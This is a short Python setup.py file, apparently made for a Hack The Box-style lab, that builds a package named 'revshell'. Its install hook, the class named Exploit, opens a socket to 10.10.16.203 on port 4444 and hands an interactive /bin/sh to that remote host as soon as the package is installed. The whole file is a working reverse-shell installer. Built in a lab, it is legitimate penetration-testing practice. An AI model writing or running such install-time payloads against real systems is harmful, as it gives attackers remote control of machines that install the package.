import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        RHOST = '10.10.16.203'
        RPORT = 4444
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        for i in range(3):
            os.dup2(s.fileno(), i)
        p = subprocess.call(["/bin/sh","-i"])

setup(name='revshell',
      version='0.0.1',
      description='Reverse Shell',
      author='jon',
      author_email='jon',
      url='http://sneakycopy.htb',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': Exploit})

